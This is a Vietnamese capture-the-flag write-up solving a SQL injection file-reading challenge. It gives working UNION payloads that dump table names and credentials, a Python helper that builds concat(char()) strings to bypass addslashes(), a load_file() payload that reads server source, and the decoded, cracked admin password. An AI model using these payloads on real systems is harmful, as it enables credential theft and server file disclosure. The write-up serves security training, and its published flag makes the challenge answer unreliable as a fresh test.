# SQL injection - File reading

**Title**: Reading file with SQL!

**Point**: 40 Points 

**Description**: Retrieve the administrator password.

## Solution:

Đầu tiên, như thông thường, ta phải tìm **Inject point**. Cái form đầu tiên chắc cú là hàng pha kè rồi, nhưng cứ thử nhập `1'`-> Nhưng mà không được

Vào link "Member" , thấy có một user **admin**. Vào đó thì thấy thông tin admin được xuất ra với truy vấn trên URL là : `?action=members&id=1`. Thử inject `1'` lần lượt vào 2 tham số thì thấy có `id` là bị vulneralbe.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161073900-c173f14d-7d84-436b-ad3b-eb17e6530ea4.png"></p>

OK, giờ thử một payload cơ bản bypass như sau để thử filter:

```
1 or '1'='1' -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161074933-76276c5f-235a-4ed9-864e-d12fab378b00.png"></p>

Vậy là payload của chúng ta bị xử lý bởi hàm `addslashes()` và chuỗi bị escape bởi backslash `\` -> Gây ra lỗi. Bypass cái này thì cơ bản rồi, tí nữa cần dùng mình sẽ nói sau

Tiếp, mình cần xác định xem số lượng cột trả về bằng `UNION`. Cái này cơ bản luôn; thử 1 cột, 2 cột cho đến khi thành công. Payload với số lượng cột đúng:

```
2 union select 1, 2, 3, 4 -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161076239-688e1b7e-487f-4e35-aaed-9c2a666f8c56.png"></p>

**Lưu ý: Trừ cột 3 thì mình có thể hiển thị thông tin ở các cột khác**

Đến lúc thực hiện lấy từ `information_schema`. Đầu tiên, ta lấy tên các bảng:

```
2 union select 1, group_concat(table_name), 3, 4 from information_schema.tables -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161076907-44976983-2575-42b3-8ad9-b39edbad2355.png"></p>

Vì có nhiều bảng mặc định trong `information_schema.tables` nên kết quả trả về hơi dài. Lướt lê lướt lả một hồi thì thấy table đáng chú ý là `member` nằm phía cuối, respect người ra đề (~ o ~)

Lấy thông tin tên các cột tương ứng với table `member` đã xác định:

```
2 union select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_name='member' -- 
```

Payload trên chắc chắn không hoạt động vì có hàm `addslashes()` quấy rối như phân tích ở trên. Ở đây mình có thể không dùng trực tiếp **string** mà dùng kiểu nối chuỗi điển hình với hàm `concat()` và `char()`. Ví dụ chuỗi `'abc'` sẽ thành `concat(char(97) , char(98) , char(99) )`. Dùng [Code Python](Generating_string.py) sau để xử lý cho tiện:

```python
################# GENERATING STRING #################

a = "member" # String need to be generated

result = "concat("
for i in range (len(a)):
    if i != len(a) - 1:
        result += "char(" + str(ord(a[i])) + ") , "
    else:
        result += "char(" + str(ord(a[i])) + ") )"
print(result)
```
Output: `concat(char(109) , char(101) , char(109) , char(98) , char(101) , char(114) )` . Đưa payload này vào `WHERE` statement:

```
2 union select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_name=concat(char(109) , char(101) , char(109) , char(98) , char(101) , char(114) ) -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161078745-51023b61-c21c-41a3-b734-bcfcae689768.png"></p>

Có các tên cột, ta có thể truy xuất dữ liệu. Kiểm tra user **admin** nằm ở dòng trả về thứ mấy: 

```
2 union select 1, group_concat(member_login), 3, 4 from member -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161079477-6e91dd33-e1c6-4f69-a8b2-43fd58a2477d.png"></p>

Xem ra chỉ có một user là **admin**. Giờ thì lấy password thôi

```
2 union select 1, group_concat(member_password), 3, 4 from member -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161079759-25d8a20a-cf87-4b34-a775-f20c4631abef.png"></p>

Password sao nhìn trông giống dạng **Encode base64** thế nhỉ. Nhưng mà có flag rồi thì submit thôi :))

Nhưng mà submit hộ , có đúng đâu 😥. Vậy là password mình đã bị encode thật rồi, nên mình sẽ decode nó ra [tại đây](https://www.base64decode.org/)

Nó ra thế này `TPWU_�_UU[_QPZWTTV�Q[QT`. Alright, những trường hợp thường thấy này là do có sự can thiệp của bên back-end server, encrypt chuỗi đầu vào rồi mới đưa vào database. Chúng ta khó có thể biết được cách encrypt nếu không có source code, ngẫm lại bài này là `File reading` nên hẳn là mình phải tìm cách đọc file.

GG được một hồi thì đa số đều suggest dùng hàm `load_file()` với tham số truyền vào là **absolute path**, path truyền vào là string và mình có thể bypass với cách dùng Python như trên. Điều khó ở đây là làm sao để tìm được cái **full path**. Đến bước này thì mình phải đoán một tí:

Đoạn này mình ngồi search nhưng vẫn không hiểu làm sao người ta tìm được path là `/challenge/web-serveur/ch31/index.php`. Có thể là từ mấy challenge có dùng **SSH connection**, nhưng thôi mình xin chôm tại cái này. Bypass string bằng python:

```python
a = "/challenge/web-serveur/ch31/index.php" # String need to be generated

result = "concat("
for i in range (len(a)):
    if i != len(a) - 1:
        result += "char(" + str(ord(a[i])) + ") , "
    else:
        result += "char(" + str(ord(a[i])) + ") )"
print(result)
```

Output:
```
concat(char(47) , char(99) , char(104) , char(97) , char(108) , char(108) , char(101) , char(110) , char(103) , char(101) , char(47) , char(119) , char(101) , char(98) , char(45) , char(115) , char(101) , char(114) , char(118) , char(101) , char(117) , char(114) , char(47) , char(99) , char(104) , char(51) , char(49) , char(47) , char(105) , char(110) , char(100) , char(101) , char(120) , char(46) , char(112) , char(104) , char(112) )
```

Đưa vào payload:

```
2 union select 1, load_file(concat(char(47) , char(99) , char(104) , char(97) , char(108) , char(108) , char(101) , char(110) , char(103) , char(101) , char(47) , char(119) , char(101) , char(98) , char(45) , char(115) , char(101) , char(114) , char(118) , char(101) , char(117) , char(114) , char(47) , char(99) , char(104) , char(51) , char(49) , char(47) , char(105) , char(110) , char(100) , char(101) , char(120) , char(46) , char(112) , char(104) , char(112) )), 3, 4 -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161085221-9122172e-572b-4f12-8b49-b9f51dfe6f92.png"></p>

Tham khảo toàn bộ source nguồn [tại đây](index.php)
Chú ý đến đoạn làm thế nào để print ra được `Authentication success !!`, tức là password đúng:

```php
 $pass = sha1($_POST['password']);
 $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
 if(mysqli_num_rows($result) == 1) 
 { 
 $data = mysqli_fetch_array($result);
 if($pass == stringxor($key, base64_decode($data['member_password'])))
 { // authentication success print "
Authentication success !!
```
Ở đây password được so sánh theo công thức: `sha1(input_password) == decode_base64(member_password) ^ key ?`. Với `member_password` mình đã có ở trên, còn `$key` thì mình mở mã nguồn ra (Ctrl + U) là thấy: `$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";`

Giờ thì mình lấy lại mấy hàm cần thiết và chạy code PHP để giải mã:

```php
<?php
    function stringxor($o1, $o2) {
        $res = '';
        for($i=0;$i<strlen($o1);$i++)
            $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
        return $res;
    }
    $key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
    $member_password = "VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==";
    $result = stringxor($key, base64_decode($member_password) );
    echo $result;
?>
```

Output: **77be4fc97f77f5f48308942bb6e32aacabed9cef**. Password mình nhập vào hash với `SHA1` ra được đối chiếu với chuỗi output này, mình thử crack cái hash này ra và hy vọng nó "đủ yếu". Dùng [Crack Station](https://crackstation.net/)

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/161094566-52dd9538-b282-453a-bf12-5f2a894d7f9e.png"></p>

Flag: **superpassword**

